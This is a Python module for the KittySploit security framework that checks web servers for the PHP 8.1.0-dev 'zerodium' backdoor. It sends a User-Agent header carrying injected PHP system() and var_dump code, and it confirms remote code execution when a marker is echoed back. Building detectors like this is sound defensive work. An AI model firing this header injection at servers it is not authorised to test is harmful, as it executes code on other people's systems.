#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""PHP 8."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'PHP 8.1.0-dev - Backdoor Remote Code Execution Detection',
        'description': "PHP 8.1.0-dev contains a backdoor dubbed 'zerodiumvar_dump' which can allow the execution of arbitrary PHP code.",
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'vulnerability', 'php', 'backdoor', 'rce', 'zerodium', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://news-web.php.net/php.internals/113838',
            'https://flast101.github.io/php-8.1.0-dev-backdoor-rce/',
            'https://github.com/flast101/php-8.1.0-dev-backdoor-rce/blob/main/revshell_php_8.1.0-dev.py',
        ],
    }

    def run(self):
        # Backdoor is triggered via User-Agent prefix "zerodium" + PHP code.
        marker = 'KSPHP81' + self.random_text(8)
        r = self.http_request(
            method='GET',
            path='/',
            headers={'User-Agent': f'zerodiumsystem("echo {marker}");'},
            allow_redirects=False,
        )
        if not r:
            return False
        body = r.text or ''
        if marker in body:
            self.set_info(
                severity='critical',
                reason='PHP 8.1.0-dev zerodium backdoor RCE confirmed',
                path='/',
            )
            return True
        # Fallback: var_dump of a fixed int unique to the backdoor evaluator
        r2 = self.http_request(
            method='GET',
            path='/',
            headers={'User-Agent': 'zerodiumvar_dump(77777355556);'},
            allow_redirects=False,
        )
        if r2 and 'int(77777355556)' in (r2.text or ''):
            self.set_info(
                severity='critical',
                reason='PHP 8.1.0-dev zerodium backdoor RCE confirmed',
                path='/',
            )
            return True
        return False

